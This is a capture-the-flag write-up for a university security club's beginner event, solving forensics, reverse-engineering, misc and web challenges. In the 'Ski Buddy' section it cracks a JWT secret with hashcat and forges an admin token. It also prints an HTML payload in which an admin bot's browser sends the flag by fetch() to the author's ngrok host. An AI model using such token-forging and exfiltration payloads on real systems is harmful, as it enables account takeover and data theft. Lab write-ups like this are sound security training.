---
created: 2025-08-22T11:34:47
---
# Welcome

## Insanity Check

> [!info] Challenge Description
> No way! There's more?!?
>
> THIS IS DRIVING ME INSAAAANNNNEEEEEEEEEEEEEE

There was a similarly-named beginner challenge called "Sanity Check" where one simply runs `nc challs.nusgreyhats.org 33000` to obtain the flag. Seeing as they are similarly-named, they must be related to each other (the challenge description doesn't really provide any new information).

After staring at the output for a while, I noticed there was a large seemingly-empty gap between the prompt and the actual output (the banner and flag):

![[../images/insanity-check-abnormal-whitespace-gap.png]]

This raised a suspicion that some information could be encoded in the [Whitespace Language](https://www.dcode.fr/whitespace-language) and hiding in plain sight. I fired up Wireshark and captured the data received by running `nc challs.nusgreyhats.org 33000` and noticed that indeed, it was a mix of `0x20` (space), `0x09` (tab) and `0x0a` (line feed) bytes. I copied all the bytes from the beginning of the hexdump and the first byte that is not any of the 3 aforementioned whitespace characters and saved it to a file named `whitespace.ws`:

![[../images/insanity-check-whitespace-hexdump.png]]

I then proceeded to upload it [here](https://www.dcode.fr/whitespace-language) to decode it. After decoding the file, the result is the flag:

![[../images/insanity-check-flag.png]]

> [!success] Flag
> `grey{7hEy_4Re_0r1Vin6_m3_1n54nE}`

# Forensics

## Shy Zipper

> [!info] Challenge Description
> My zip file ate my flag and won't open up! It also has anxiety so I don't want to force it open if it doesn't want to open up. Can you help me get back my flag?

The challenge contains a single zip file, `shy_zipper.zip`. Opening this zip file, it contains a few files with Base64-encoded names and a file named `dont_unzip_me!.txt`.

![[../images/shy-zipper-listing.png]]

The files that have Base64-encoded names (they decode to `ilovenusgreyhatsandipromisetonotusestringsagain`, `nonsensestuffthatyoushouldnttouch`, `superannoyingnoisethatringsinyourear`, and `evenmoreuselessstuffbecausestringsisbad`, respectively) have the exact same content — Base64-encoded placeholder text:

```
Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.

```

`dont_unzip_me!.txt` contains:

```
you shouldn't have come here. but since you did, the flag is in base64, so don't you dare strings it
```

So there is a hint that the flag is in Base64. However, none of the files in the zip file contains the flag. Thinking that this ZIP file must have been altered somehow, I opened this file in ImHex and parsed it with the ZIP compression archive pattern (`zip.hexpat`), and noticed that at the end, there was some data at the end of the file that wasn't parsed by ImHex:

![[../images/shy-zipper-appended-base64-data.png]]

This data, when decoded, is the flag.

```
Z3JleXtzMG0zX1RoMU5nNV80cjNfYjN0VDNyX0wzZlRfdU56MVBwM2R9
```

> [!success] Flag
> `grey{s0m3_Th1Ng5_4r3_b3tT3r_L3fT_uNz1Pp3d}`

## Cosmic Bit Flip

> [!info] Challenge Description
> I was drawing out a flag for a CTF challenge, but then my laptop got hit by a cosmic bit flip and it just looks like a bunch of static now! Where did the flag go?
> 
> Flag Format: `flag{...}`

A single `flag.png` image is provided, that appears to be "a bunch of static":

![[../images/cosmic-bitflip-seemingly-static.png]]

Running `pngcheck.exe -v flag.png` reveals that this image is indeed corrupt, somehow:

```
File: .\flag.png (856267 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1029 x 242 image, 24-bit RGB, non-interlaced
  chunk IDAT at offset 0x00025, length 65536
    zlib: deflated, 32K window, default compression

    private (invalid?) row-filter type (169) (warning)
    invalid row-filter type (57)
    zlib: inflate error = -5 (buffering error)
ERRORS DETECTED in .\flag.png
```

I read up on the PNG file format and attempted to analyze the raw pixel data in ImHex:

- PNG has a header chunk (`IHDR` that describes the image's width and height, and **pixel color type** - two common ones are **RGB triple** (mapped to `0x02`) and **RGBA** (mapped to `0x06`))
- They are then followed by other chunk types, but the most prominent one is `IDAT`, which contains the compressed pixel data

I added the following ImHex pattern below the built-in PNG pattern ([`png.hexpat`](https://github.com/WerWolv/ImHex-Patterns/blob/bf94cb72435ec4fddc7851f28af18acc0cce5c43/patterns/png.hexpat)) to retrieve the full (compressed) raw pixel data (this data will appear in the **Sections** tab in ImHex):

```
std::mem::Section idat_data_section = std::mem::create_section("IDAT data");
u32 len = 0;
for (u32 i = 0, i < std::core::member_count(chunks.set.chunks), i += 1) {
    if (chunks.set.chunks[i].name == "IDAT") {
        std::mem::copy_value_to_section(chunks.set.chunks[i].data, idat_data_section, len);
        len += chunks.set.chunks[i].length;
    }
}
```

I saved this data and decompressed it using CyberChef. From the pixel values, it can be observed that, after the row filter type byte `0x01`, the byte `0x00` occurs every **4** bytes, suggesting that each pixel actually uses 4 bytes of storage space.

![[../images/cosmic-bitflip-raw-pixel-data.png]]

By changing the `IHDR.color_type` field from `0x02` (`RGBTriple`) to `0x06` (`RGBA`) and saving it to a new PNG file, I was able to recover the "uncorrupted" image:

![[../images/cosmic-bitflip-recovered-flag.png]]

> [!success] Flag
> `flag{b1t_fl1p_m4d3_my_fl4g_tr4nsp4r3n7}`

> [!note]- Useful References
> - [PNG structure for beginner. Learn PNG file structure to solve basic… | by 0xwan | Medium](https://medium.com/@0xwan/png-structure-for-beginner-8363ce2a9f73)
> - [PNG (Portable Network Graphics) Specification](https://www.libpng.org/pub/png/spec/1.1/png-1.1-pdg.html)
> - [PNG Specification: Chunk Specifications](https://www.w3.org/TR/PNG-Chunks.html)

## Stolen Disk

> [!info] Challenge Description
> NUS Greyhats' backup for a small VM went missing after elijah5399 graduated. We managed to recover a single disk image and an email fragment but something about it seems off..

> [!info] Hint
> some flags to help you out so its not guessy :P : `-aes-256-cbc -salt -pbkdf2 -iter 100000`

This challenge consists of a raw disk image (`grey_disk_chall.img`) and an email file (`sus_email.txt`).

For the raw disk image, I just used 7-zip to browse the disk. The only noteworthy files were `/home/welcomectf/readme.txt` and `/home/welcome/ctf/user.txt`.

`/home/welcomectf/readme.txt` contains:

```
This is a normal VM filesystem used by NUS Greyhats.

```

`/home/welcomectf/user.txt` contains:

```
user: greyhat007

```

The email contains:

```
From: greycats@nusgreyhats.org
Subject: Backup rotation note

Note: Same phrase as the party in the Hollywood Hills when encrypting the backup — gr3yc4ts_4r3_my_F4v

```

From the email, we can infer that there will be some place where a password will be needed eventually.

Moving on, while using 7-Zip's "Info" feature to get more information on the disk image, I noticed there was a warning that there is additional data after the end of the payload data:

![[../images/stolen-disk-7zip-info.png]]

So, I opened this file in HxD and navigated to the end of the file. Sure enough, there was an OpenSSL-encrypted (with a salt) blob:

![[../images/stolen-disk-openssl-encrypted-blob.png]]

I exported this blob to a file named `enc.bin` and using the command parameters provided in the hint (as well as the likely password obtained from the email), I was able to decrypt this blob using the following command:

```bash
openssl enc -d -aes-256-cbc -salt -pbkdf2 -iter 100000 -in enc.bin -out dec.bin -k 'gr3yc4ts_4r3_my_F4v'
```

I opened the resulting file `dec.bin` in HxD and noticed it is a GZIP file (its first two bytes match the GZIP magic, `0x1F 0x8B`). I decompressed this file and inside it was a single file, `flag.txt`, which contains the flag.

> [!success] Flag
> `grey{trust_N0_On3_but_Gr3YH4Ts}`

# Web

## Ski Buddy

> [!info] Challenge Description
> It is important to get the latest updates while skiing.

> [!info] Hint
> beware of any rock you might encounter while skiing!

The source code of the application (a Flask application), as well as the backend "bot" (node.js and puppeteer), is provided. The relevant parts of the source code are:

`app.py`:

```python
ADMIN_HOST = os.environ.get('ADMIN_HOST', '127.0.0.1')
try:
    ADMIN_HOST = socket.gethostbyname(ADMIN_HOST)
    print(f"Resolved ADMIN_HOST: {ADMIN_HOST}")
except Exception as e:
    print(f"Failed to resolve ADMIN_HOST: {e}")
    ADMIN_HOST = '127.0.0.1'
ADMIN_PORT = int(os.environ.get('ADMIN_PORT', 3001))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_news', methods=['POST'])
def submit_news():
    try:
        data = request.form
        url = data.get('url', '').strip()
        if not url:
            return "URL is required", 400

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADMIN_HOST, ADMIN_PORT))
        s.sendall(url.encode())
        s.close()

        return "News URL submitted for admin review"

    except Exception as e:
        print(e)
        return "Error submitting URL", 500

@app.route('/ws', websocket=True)
def handle_websocket():
    ws = Server.accept(request.environ)
    connected_clients.add(ws)

    secret = os.environ.get('JWT_SECRET', os.urandom(32).hex())
    payload = {
        "username": "guest",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # expires in 1 hour
    }
    token = jwt.encode(payload, secret, algorithm="HS256")
    ws.send(json.dumps({"type": "token", "token": token}))
    
    try:
        ws.send(json.dumps({"type": "initial_alerts", "data": [generate_random_alert() for _ in range(6)]}))
        
        while True:
            try:
                message = ws.receive()
                data = json.loads(message)
                if data.get("type") == "auth":
                    token = data.get("token")
                    try:
                        decoded = jwt.decode(token, secret, algorithms=["HS256"])
                        username = decoded.get("username", "guest")
                        ws.send(json.dumps({"type": "auth_success", "username": username}))
                        if username == "admin":
                            if request.remote_addr == ADMIN_HOST:
                                ws.send(json.dumps({"type": "flag", "message": os.environ.get('FLAG', 'No flag set')}))
                            else:
                                ws.send(json.dumps({"type": "flag", "error": "Unauthorized flag access from IP: " + request.remote_addr}))
                    except jwt.ExpiredSignatureError:
                        ws.send(json.dumps({"type": "auth_error", "error": "Token expired"}))
                    except jwt.InvalidTokenError:
                        ws.send(json.dumps({"type": "auth_error", "error": "Invalid token"}))
            except ConnectionClosed:
                break
            except:
                break
                
    except:
        pass
    finally:
        connected_clients.discard(ws)
    
    return ''
```

`bot.js`:

```javascript
const visitSubmission = async (url) => {
    console.log("Visiting:", url);
    const browser = await getBrowser()
    const page = await browser.newPage()
    try {
        await page.goto(url, { waitUntil: 'networkidle2', timeout: 5000 })
    }
    catch (e) {
        console.log(e)
    }
    await page.close()
    returnBrowser(browser)
}
```

Both apps are running inside docker containers. The `compose.yaml` contains:

```yaml
services:
  ski_buddy_app:
    container_name: ski-buddy-app
    build:
      context: ski-buddy
      dockerfile: Dockerfile
    restart: always
    ports:
      - "33335:8000"
    environment:
      - FLAG=grey{fake_flag}
      - ADMIN_HOST=ski-buddy-admin
      - ADMIN_PORT=3001
      - JWT_SECRET=fake_secret
  ski_buddy_admin:
    container_name: ski-buddy-admin
    build:
      context: admin
      dockerfile: Dockerfile
    restart: always
```

From the source code above, it can be deduced that as an attacker, we can get the bot to retrieve our payload, where the payload will make a WebSocket connection to somehow authenticate as admin (with an admin token).

Since our payload will be running inside the bot, and we want the remote address of the WebSocket connection to be `127.0.0.1` (otherwise the message `Unauthorized flag access from IP: ...` is returned instead), we can use the address `ws://ski-buddy-app:8000/ws` (Docker networking shenanigans — if `ws://127.0.0.1:8000/ws` was used, it wouldn't work because `127.0.0.1` refers to the _current_ container, `ski-buddy-admin`, not the `ski-buddy-app` container).

We still need some way of obtaining an admin token. Through luck, I decided to use `hashcat` for this (with `-m 16500` and `rockyou.txt` as the password list — in hindsight, the hint contains the words **rock you**), to crack the secret used to sign the JWT token using an existing unprivileged token, and was able to obtain the JWT secret:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaWF0IjoxNzU1NDAyNjA2LCJleHAiOjE3NTU0MDYyMDZ9.PaPqX4ub1-UkhgQbhWGYM3_tWlFGIjfjoWyY9rzrlSY:t0ilet
```

I then used this secret to sign my own admin token with the following payload:

```json
{
  "username": "admin",
  "iat": 1755404606,
  "exp": 1755408206
}
```

Which resulted in the following signed token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU1NDA0NjA2LCJleHAiOjE3NTU0MDgyMDZ9.xoLVoCaX96xbNOTisECNWlKKe7ZewnI9C-NjGA0ExP0
```

I then came up with the following payload (I named it `file.html`), and served it through ngrok TCP (forwarding `python -m http.server 8000`):

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
<script>
(async () => {
    const ws = new WebSocket("ws://ski-buddy-app:8000/ws");
    ws.onopen = (event) => {
      fetch("http://0.tcp.ap.ngrok.io:11060/" + JSON.stringify(event));
      let adminToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU1NDA0NjA2LCJleHAiOjE3NTU0MDgyMDZ9.xoLVoCaX96xbNOTisECNWlKKe7ZewnI9C-NjGA0ExP0";

      // Send auth message
      ws.send(JSON.stringify({ type: "auth", token: adminToken }));
    };

    ws.onmessage = async (event) => {
      await fetch(`http://0.tcp.ap.ngrok.io:11060/MSG_FROM_SERVER______${event.data}`);
      let msg = JSON.parse(event.data);

      if (msg.type === "auth_success") {
        if (msg.username === "admin") {
          // Now the server should send the flag
          await fetch("http://0.tcp.ap.ngrok.io:11060/auth_successful_admin");
        }
      }

      if (msg.type === "flag") {
        // Exfiltrate to your own server
        await fetch("http://0.tcp.ap.ngrok.io:11060/" + encodeURIComponent(msg.message));
      }
    };
})();
</script>
</body>
</html>
```

I then submitted the URL `http://0.tcp.ap.ngrok.io:11060/file.html` in the web application, and was able to obtain the flag from the HTTP logs:

![[../images/ski-buddy-flag.png]]

> [!success] Flag
> `grey{skibidi_toilet_2ea989edfabfe44f526d7edd0dd8df27}`

# Rev

## Whats In The Bag 🍼

> [!info] Challenge Description
> Find out how to make a bag, and what to put in it!

A single ELF binary is provided. I just opened it in IDA, and decompiled the `main` function:

![[../images/whats-in-the-bag-main-function.png]]

Based on the decompilation, we can simply piece together the flag with the following Python code:

```python
>>> "grey{th3_b4g_c0nt41ns_" + str(sum(ord(c) for c in "greycat")) + "_greycats!!}"
'grey{th3_b4g_c0nt41ns_751_greycats!!}'
```

> [!success] Flag
> `grey{th3_b4g_c0nt41ns_751_greycats!!}`

## Flag Checker Baby 🍼

> [!info] Challenge Description
> Flag checker is kinda hard so I made an easier version of it!
> 
> p.s. `welcome-ctf-ida-guide.zip` might be helpful if you're new to reverse engineering!

A single ELF binary is provided. I just opened it in IDA, and decompiled the `main` function:

![[../images/flag-checker-baby-main-function.png]]

We can see that it calls `sub_1325` to check if the flag is correct. I double-clicked on this function and it seems like it decrypts the encrypted flag stored in the executable by subtracting 7 and then XORing each byte with `0x5A` and compares it with the input:

![[../images/flag-checker-baby-flag-checker-function.png]]

I exported the encrypted flag (21 bytes) and decrypted it with the following Python code:

```python
>>> bytes(((b - 7) ^ 0x5A) & 0xFF for b in bytes.fromhex("442F462A28303A3E313D460C3E463B360C2F46332E"))
b'grey{simple_menu_rev}'
```

> [!success] Flag
> `grey{simple_menu_rev}`

## Flag Checker

> [!info] Challenge Description
> A simple flag checker... wait... I can't run it??!?

A single ELF binary is provided. I just opened it in IDA, and decompiled the `start` function. Inside it, it receives user input and calls `sub_40049D` to check whether the flag is correct:

![[../images/flag-checker-receiving-input-and-checking-flag.png]]

I proceeded to analyze the `sub_40047A` function since it is where it checks whether the flag is correct. It first checks if the input is 36 characters long using a `strlen`-like function (we can infer that the flag is 36 characters), and then calls `sub_400462` to perform further checks:

![[../images/flag-checker-strlen-check.png]]

`sub_400462` checks if the first character is equal to the first character of a "mangled"-looking flag, `grey{fL?c3_0|H7Ohr5f#lTwlf9T7e+}`, and then calls _another_ function, `sub_400449`, where it performs the comparison for the second character, and so on:

![[../images/flag-checker-input-char-idx-0-comparison.png]]

This repeats until the 6th character (index 5), where there is a different type of check:

![[../images/flag-checker-input-char-idx-5-and-18-comparison.png]]

This function imposes constraints that:

- The character at index 5 of the input must be equal to the character at index 5 of the mangled flag
- Only then will it proceed to compare the character at index 18 of the input to the character at index 6 of the mangled flag
- Only when both conditions succeed, will it proceed to the next check, `sub_40039B`

`sub_40039B` has another type of check, this time by performing arithmetic and bitwise operations before comparing it to a character from the mangled flag:

![[../images/flag-checker-input-char-idx-10-comparison.png]]

Then it calls `sub_400362` if the comparison succeeds. `sub_400362` performs another type of check — one that introduces a dependency on another character (`input[28]` must be equal to `mangled_flag[9]` and `input[28] + input[31]` must be equal to `mangled_flag[8]`):

![[../images/flag-checker-input-char-idx-28-and-31-comparison.png]]

There are many more types of checks, including straight comparisons, and more. Since there are so many constraints, I decided to use [Z3](https://github.com/Z3Prover/z3) for this. Translated into `z3-solver` constraints, the code to solve for the flag looks like:

```python
import z3

mangled = b"grey{fL?c3_0|H7Ohr5f#lTwlf9T7e+}"
flag = [z3.BitVec(f'c{i}', 8) for i in range(36)]
s = z3.Solver()
s.add(flag[0] == mangled[0])
s.add(flag[1] == mangled[1])
s.add(flag[2] == mangled[2])
s.add(flag[3] == mangled[3])
s.add(flag[4] == mangled[4])
s.add(flag[5] == mangled[5])
s.add(flag[18] == mangled[6])
s.add(((flag[10] - 19) ^ 0x2B) + 10 == mangled[7])
s.add(flag[28] == mangled[9])
s.add(flag[28] + flag[31] == mangled[8])
s.add(flag[25] == flag[29])
s.add(flag[22] == flag[25])
s.add(flag[16] == flag[22])
s.add(flag[12] == flag[16])
s.add(flag[8] == flag[12])
s.add(flag[29] == mangled[10])
s.add(flag[6] == mangled[11])
s.add(flag[14] == mangled[13])
s.add(flag[14] + flag[9] == mangled[12])
s.add(flag[13] == mangled[14])
s.add(flag[23] == mangled[15])
s.add(flag[27] == mangled[16])
s.add(flag[7] == mangled[17])
s.add(flag[21] == mangled[18])
s.add(flag[24] == mangled[19])
s.add(flag[32] - 47 == mangled[20])
s.add(flag[11] == mangled[21])
s.add(flag[26] == mangled[22])
s.add(flag[30] == mangled[23])
s.add(flag[33] == mangled[24])
s.add(flag[17] == mangled[25])
s.add(flag[20] == mangled[26])
s.add((flag[34] + 3) ^ 0x67 == mangled[27])
s.add(flag[13] == mangled[28])
s.add(flag[15] == mangled[29])
s.add((flag[19] - 46) ^ 0x18 == mangled[30])
s.add(flag[35] == mangled[31])

if s.check() == z3.sat:
    m = s.model()
    print(bytes([m[c].as_long() for c in flag]))
```

Running the above code prints the recovered flag:

> [!success] Flag
> `grey{f0r_41l_7He_fLa95_Of_Th3_w0Rl0}`

## Wannaflag

> [!info] Challenge Description
> I downloaded this cool program my friend sent me, he told me it would add some cool ascii art to my flag file. However, after running the program, it seems like my flag.txt file is encrypted! What can I do?

An executable, `beautify_flag.exe` was provided, along with two other files, `actual_flag.blackhat` and `flag.txt`. `actual_flag.blackhat` seems to contain an encrypted flag:

![[../images/wannaflag-actual-flag-encrypted.png]]

`flag.txt` just contains `grey{fake_flag}`.

I opened `beautify_flag.exe` in IDA and immediately noticed it was a RAR SFX (self-extracting archive):

![[../images/wannaflag-beautify-flag-rarsfx.png]]

So I proceeded to close IDA and used 7-Zip to open `beautify_flag.exe`, which contains an executable and a DLL:

![[../images/wannaflag-beautify-flag-contents.png]]

I extracted both files and analyzed `flag_enhancer.exe` in IDA first. I decompiled the `main` function and it seems to be loading the `not_sus.dll` library and calling an export named `fjdsmfposmvcs` on a buffer containing the original flag's contents. Therefore, it can be deduced that this export must be an encryption function of some sorts.

![[../images/wannaflag-flag-enhancer-loading-not-sus-dll.png]]
![[../images/wannaflag-flag-enhancer-reading-flag-contents.png]]
![[../images/wannaflag-flag-enhancer-calling-fjdsmfposmvcs-on-flag-contents.png]]
![[../images/wannaflag-flag-enhancer-writing-encrypted-flag.png]]

So, I proceeded to analyze `not_sus.dll`'s `fjdsmfposmvcs` export:

![[../images/wannaflag-not-sus-dll-fjdsmfposmvcs.png]]

`generate_ejrwwdfs` simply copies `grey_hats_is_cool` into the buffer provided as its first argument and returns the length of said string.

`askodamdsa` looks like an RC4 key scheduling function, taking in a key (that is `grey_hats_is_cool` in this case) and its length:

![[../images/wannaflag-not-sus-dll-askodamdsa.png]]

`djfoisjfmvcx` looks like the function performing the XOR between the keystream and the plaintext:

![[../images/wannaflag-not-sus-dll-djfoisjfmvcx.png]]

So, it can be theorized that the encrypted flag is just encrypted using RC4 with the key `grey_hats_is_cool`. I used CyberChef to decrypt the encrypted flag, and was able to retrieve the flag:

![[../images/wannaflag-decrypted-flag.png]]

> [!success] Flag
> `grey{wh47_k1nd_0f_r4N50mw4r3_u535_rc4}`

## Organised Person

> [!info] Challenge Description
> I love to organise my stuff by packing them! But i forgot the password for this file ;-;

A single executable `check_flag.exe` was provided. I opened it in IDA and poked around to find the entrypoint (which turned out to be `sub_140001884`). This function seems to be calling a function, `sub_1400014F0`, that returns a function pointer which it then calls (and gives it several standard library functions like `strlen`):

![[../images/organised-person-sub_1400014F0.png]]

I proceeded to analyze `sub_1400014F0` further. This function seems to be decrypting an embedded payload (`byte_140008000`) by XORing it with a hardcoded key (`grey{l00k_aT_mE_im_da_fL4g_wAit_y0u_aRe_igNor1nG_me_T_T}`) and preparing for it to be executed from memory (evidenced by the use of the `VirtualProtect` API to change the page protection of the `VirtualAlloc`ed buffer to `PAGE_EXECUTE_READ`):

![[../images/organised-person-decrypting-payload-and-virtualprotect.png]]

Then it seems to be locating the `check_flag` export and returning the address of said export.

I exported the encrypted payload and wrote a small Python script to decrypt it and save the output to a file named `output.bin`:

```python
key = "grey{l00k_aT_mE_im_da_fL4g_wAit_y0u_aRe_igNor1nG_me_T_T}"
payload = bytes.fromhex("...")
buf = bytearray(0x3800)
for i in range(0x3800):
    buf[i] = ord(key[i % len(key)]) ^ payload[i]
with open("output.bin", "wb") as f:
    f.write(buf)
```

The decrypted payload turns out to be a PE file, too. I opened this file in IDA and analyzed the `check_flag` export. This function reads a flag, decrypts the expected flag and compares the input against it:

![[../images/organised-person-payload-decrypting-flag.png]]

I came up with the following Python script to decrypt the flag myself (note that 1 byte is overwritten from the line `*(_DWORD *)&v10[7] = 0x96C5300;`, so I included `v9.pop()` to remove the overwritten byte):

```python
v9 = bytearray()
v9.extend((0x1705040000000000).to_bytes(8, "little"))
v9.extend((0x59321204173C3701).to_bytes(8, "little"))
v9.extend((0x23238215E17202C).to_bytes(8, "little"))
v9.extend((0x49684B001D436359).to_bytes(8, "little"))
v9.extend((0xC3A15103A1C280E).to_bytes(8, "little"))
v9.extend((0x29502D781F377C).to_bytes(8, "little"))
v9.pop()  # 1 byte is overwritten due to assigning a DWORD at index 7
v9.extend((0x96C5300).to_bytes(4, "little"))

some_string = "grey{ehHhhH_aM_i_tH1s_sl00py_;-;}"
for i in range(len(v9)):
    c = v9[i] ^ ord(some_string[i % len(some_string)])
    print(chr(c), end='')
```

Running the above Python script prints the decrypted flag:

> [!success] Flag
> `grey{am_i_tHe_m0sT_oRgAniS3d_pErsOn_in_d4_w0r1d_:3}`

# Misc

## Crazy Gifarfe

> [!info] Challenge Description
> OMG that's some ccrrraaaazzyyy GIFARFES, no way those necks don't hurt

A single GIF file `crazy_gifarfe.gif` was provided. It just shows two giraffes shaking their necks:

![[../images/crazy-gifarfe-gif.png]]

After a quick glance at the file's hexdump in HxD, I found what looks like a ZIP end of central directory signature (`PK\x05\x06`) at the end of the file:

![[../images/crazy-gifarfe-gif-zip-eocd-signature-in-hexdump.png]]

I then used `binwalk` to confirm that there was indeed data embedded in this GIF file:

![[../images/crazy-gifarfe-binwalk-output.png]]

So, I used `binwalk -e crazy_gifarfe.gif` to export the embedded data. The embedded data seems to be a `.jar` file, which is just a ZIP file, essentially. It contains a class file (with the path `dFrLc/f0vtW.class`). I proceeded to use an [online Java decompiler](https://www.decompiler.com) to decompile this class file:

![[../images/crazy-gifarfe-decompiled-java-class.png]]

With this, we can simply piece together the flag using the following Python script:

```python
>>> "grey{G1F4RF3_s4Y5_" + "".join(['R', 'u', '6', '_', '4', '_', '0', 'u', 'B', '_', 'd', 'U', '8', '_']) + "mY_n3Ck_1S_j3L1y}"
'grey{G1F4RF3_s4Y5_Ru6_4_0uB_dU8_mY_n3Ck_1S_j3L1y}'
```

> [!success] Flag
> `grey{G1F4RF3_s4Y5_Ru6_4_0uB_dU8_mY_n3Ck_1S_j3L1y}`

## Ads

> [!info] Challenge Description
> What does ADS stand for again? Was it Alternate Data Shift? Or was it Alternate Data Spectrogram? Hmm... whatever. Here is a file containing my secrets. Try to uncover them if you can.
> 
> Extract the provided file using WinRAR with administrator privileges.

A single file `secret_message.rar` was provided. Unfortunately, I did not have WinRAR at the time, so I just opened it with 7-Zip:

![[../images/ads-7zip-listing.png]]

Seeing as the challenge's name is "Ads", it makes sense that it makes use of alternate data streams (an NTFS feature commonly abused to hide data). The `secret1.txt` stream gives the first part of the flag and a hint for the next part of the flag:

```
grey{@lt3rnat3_dat@_5tr3ams



Hint for my next secret: Circular Shift

```

The `secret2.txt` stream contains a hex dump:

```
F5 25 F5 07 27 33 47 45 97 F5 36 03 F6 C4
```

Given the hint was "circular shift", I used CyberChef to brute force the number of bit rotations required to obtain the plaintext. It was 4:

![[../images/ads-secret2-decrypted.png]]

The `secret3.wav` stream is an audio file that sounds like gibberish. Given the challenge description contains "Alternate Data Spectrogram", I extracted the stream's data into an actual file using the following PowerShell command:

```powershell
Set-Content -Value (gc -Stream secret3.wav .\secret_message.txt -AsByteStream -ReadCount 0) -Path "test.wav" -AsByteStream
```

I then used [this tool](https://www.dcode.fr/spectral-analysis) to view the audio file's spectrogram, which revealed the last part of the flag:

![[../images/ads-secret3-spectrogram.png]]

> [!success] Flag
> `grey{@lt3rnat3_dat@_5tr3ams_R_pr3tTy_c0oL_t0_H1d3_s3cret5!}`

## Nus Geographer

> [!info] Challenge Description
> Bluey decided to take a walk around NUS before school starts. He wrote down some lines in his diary for Pinky to follow. Can you figure out the message to Pinky?
> 
> The flag format is: `grey{THE_FLAG_IN_UPPERCASE_AND_UNDERSCORE_ONLY}`
> 
> Note: Do not brute force any APIs. When in doubt, maybe the dates can help you.

A single file `diary.txt` was provided, containing entries that looks like:

```
On 09 August 2025, I went LT35-01-01 at 12:32 PM.
On 07 August 2025, I went Y-CR15 at 9:20 AM.
On 03 August 2025, I went AS4-0116 at 2:34 PM.
On 15 August 2025, I went EW1-01-01 at 1:01 PM.
Today's weather was so hot! How is it 330 degrees on 06 August 2025?
...
```

After thinking for a bit, I hypothesized that the route taken to visit various NUS venues in the same day represents a character of some sorts, and the "weather" lines just represent how much degrees this character was rotated by (the temperature couldn't be 330 degrees... and the values are within range of angle degrees (0-360)).

I also found a JSON file maintained by nusmods that map NUS venues to coordinates [here](https://github.com/nusmodifications/nusmods/blob/master/website/src/data/venues.json).

So, I came up with the following Python script to parse the lines and generate maps for each day that draws a polyline for the route (after rotating it in the _opposite_ direction):

```python
import re
import math
import json
from datetime import datetime

import folium

with open("diary.txt", "r") as f:
    data = f.read().splitlines()

with open("venues.json", "r") as f:
    venue_data = json.loads(f.read())

trip_pattern = re.compile(r"On (\d{2} \w+ \d{4}), I went ([A-Za-z0-9\-_]+) at ([0-9: ]+[APM]+)\.")
angle_pattern = re.compile(r"How is it (\d+) degrees on (\d{2} \w+ \d{4})")

trips = []
angles = {}

for line in data:
    trip_match = trip_pattern.search(line)
    angle_match = angle_pattern.search(line)

    if trip_match:
        date_str, location, time_str = trip_match.groups()
        dt = datetime.strptime(date_str + " " + time_str, "%d %B %Y %I:%M %p")
        trips.append({"datetime": dt, "location": location})
    elif angle_match:
        angle, date_str = angle_match.groups()
        dt = datetime.strptime(date_str, "%d %B %Y").date()
        angles[dt] = int(angle)

trips.sort(key=lambda x: x["datetime"])

route_coords = {}
for t in trips:
    trip_date = t["datetime"].date()
    if trip_date not in route_coords:
        route_coords[trip_date] = []
    loc = t["location"]
    if loc in venue_data:
        coords = venue_data[loc]["location"]
        route_coords[trip_date].append((coords["y"], coords["x"]))  # (lat, lon)


def rotate_route(coords, angle_degrees):
    """
    Rotate a polyline route around its centroid by angle_degrees.
    coords: list of (lat, lon) tuples
    """
    angle = math.radians(angle_degrees)

    # Compute centroid
    cx = sum(x for x, y in coords) / len(coords)
    cy = sum(y for x, y in coords) / len(coords)

    rotated = []
    for x, y in coords:
        # Translate to origin
        tx, ty = x - cx, y - cy
        # Apply rotation
        rx = tx * math.cos(angle) - ty * math.sin(angle)
        ry = tx * math.sin(angle) + ty * math.cos(angle)
        # Translate back
        rotated.append((rx + cx, ry + cy))
    return rotated


route_coords_items = list(route_coords.items())
for i, (date, route) in enumerate(route_coords_items):
    m = folium.Map(location=route_coords_items[0][1][0], zoom_start=14)
    folium.PolyLine(
        rotate_route(route, -angles[date]),
        smooth_factor=0,
        color="black",
        weight=6,
        tooltip=str(date),
    ).add_to(m)
    m.save(f"route-{str(date)}.html")
```

Indeed, in line with my hypothesis, the polyline on each day just represent characters — e.g., on 2025-07-25, the letter was 'M':

![[../images/nus-geographer-25-july-letter.png]]

I was then able to piece together the flag by seeing each day's letter (in ascending order of date).

> [!success] Flag
> `grey{IM_JUST_A_NUSMODS_MONKEY}`
